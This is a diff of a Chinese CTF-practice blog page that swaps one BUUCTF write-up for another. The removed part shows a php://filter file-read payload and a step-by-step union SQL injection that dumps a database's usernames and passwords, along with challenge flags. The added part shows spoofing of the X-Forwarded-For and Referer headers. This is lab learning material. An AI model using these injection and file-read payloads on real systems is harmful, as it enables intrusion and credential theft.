-    不区分大小写的strstr（）版本。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201191659627.png" style="zoom:150%;">
 
-<p>看到过滤了input、data，是伪协议里的，那就考虑filter读取文件，构造payload:</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>file<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.base64-encode/resource=flag.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>页面返回flag.php的源码，解密后看到flag：<code>flag{b3f2f2c1-5e4f-4b48-8bc5-1cf85ef574b2}</code></p>
-<p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201171145473.png"></p>
-<h2 id="9-极客大挑战-2019-LoveSQL"><a href="#9-极客大挑战-2019-LoveSQL" class="headerlink" title="9.[极客大挑战 2019]LoveSQL"></a>9.[极客大挑战 2019]LoveSQL</h2><p>考察联合注入:</p>
-<p>首先在username处输入<code>1'</code>,password输个1，发现语法报错，即存在sql注入。接着先查看一下字段数：</p>
-<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1' order by 4 #   报错
-1' order by 3 #   无报错，说明三个字段<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p>然后试下联合查询爆破所有数据库：</p>
-<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1' union select 1,2,group_concat(schema_name) from information_schema.schemata #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu/202201191050615.png"></p>
-<p>看到有geek，大概率就是他了，接下来查看表名：</p>
-<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='geek' #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu/202201191050616.png"></p>
-<p>接着试试查看l0ve1ysq1表里的列名：</p>
-<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='l0ve1ysq1' #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu/202201191050617.png"></p>
-<p>最后就可以直接拿数据了：</p>
-<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1' union select 1,2,group_concat(id,username,password) from l0ve1ysq1 #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>得到flag{fbee60d0-759c-4012-a59b-bc0509fa5431}。</p>
-<h2 id="10-GXYCTF2019-Ping-Ping-Ping"><a href="#10-GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="10.[GXYCTF2019]Ping Ping Ping"></a>10.[GXYCTF2019]Ping Ping Ping</h2><p>又是一道命令执行漏洞的题目，不过存在了很多过滤，自己试了多种方法也不得行，看了一个师傅的博客学到了,tql，直接贴链接吧：</p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39190897/article/details/116247765?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164256111016780274119167%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=164256111016780274119167&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-3-116247765.pc_search_result_control_group&amp;utm_term=ping%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/weixin_39190897/article/details/116247765?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164256111016780274119167%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=164256111016780274119167&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-3-116247765.pc_search_result_control_group&amp;utm_term=ping%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87&amp;spm=1018.2226.3001.4187</a></p>
+<ul>
+<li>这又说必须本地访问，再改<code>X-Forwarded-For</code>拿到flag:</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201191659628.png"></p>
+<p>这里讲一下这三个参数：</p>
+<ul>
+<li><code>Referer</code>: 浏览器向 WEB 服务器表明自己是从哪个 网页/URL 获得/点击 当前请求中的网址/URL(你从哪来的)。</li>
+<li><code>User-Agent</code>: 浏览器表明自己的身份（是哪种浏览器）。 </li>
+<li><code>X-Forwarded-For</code>: 表示 HTTP 请求端真实 IP。</li>
+</ul>
 <hr>
-<p>刷了十道题咧，哎，还是太菜了，不果慢慢有节奏了，慢慢学吧~</p>
-<p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948723.png"></p>
+<img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201191659121.jpg" style="zoom:150%;">
 
                 
             </div>
@@ -953,7 +674,7 @@ cmd1 <span class="token operator">||</span> cmd2               <span class="toke
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://huhu-myh.github.io/posts/myh10004.html">https://huhu-myh.github.io/posts/myh10004.html</a>
+                    <a href="https://huhu-myh.github.io/posts/myh10008.html">https://huhu-myh.github.io/posts/myh10008.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -1464,45 +1185,47 @@ new Valine({
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/posts/myh10005.html">
+                <a href="/posts/myh10008.html">
                     <div class="card-image">
                         
-                        <img src="/medias/img/4.jpg" class="responsive-img" alt="Linux学习-第二章">
+                        <img src="/medias/img/7.jpg" class="responsive-img" alt="buuctf练习[11-20]">
                         
-                        <span class="card-title">Linux学习-第二章</span>
+                        <span class="card-title">buuctf练习[11-20]</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            记录系统学习linux之旅~。
+                            准备一天一题buu~。
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-01-15
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-01-19
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E5%AD%A6%E4%B9%A0/" class="post-category">
-                                    学习
+                            <a href="/categories/CTF/" class="post-category">
+                                    CTF
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/linux/">
-                        <span class="chip bg-color">linux</span>
+                    <a href="/tags/buu%E7%BB%83%E4%B9%A0/">
+                        <span class="chip bg-color">buu练习</span>
                     </a>
                     
                 </div>
@@ -1516,23 +1239,23 @@ new Valine({
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/posts/myh10002.html">
+                <a href="/posts/myh10007.html">
                     <div class="card-image">
                         
-                        <img src="/medias/img/2.jpg" class="responsive-img" alt="Linux学习-第一章">
+                        <img src="/medias/img/6.jpg" class="responsive-img" alt="Linux学习-第三章">
                         
-                        <span class="card-title">Linux学习-第一章</span>
+                        <span class="card-title">Linux学习-第三章</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            记录系统学习linux之旅~。
+                            本章先学习vim编辑器的使用~。
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-01-14
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-01-17
                             </span>
                         <span class="publish-author">
                             
@@ -1545,14 +1268,6 @@ new Valine({
                             
                         </span>
                     </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/linux/">
-                        <span class="chip bg-color">linux</span>
-                    </a>
-                    
                 </div>
                 
             </div>
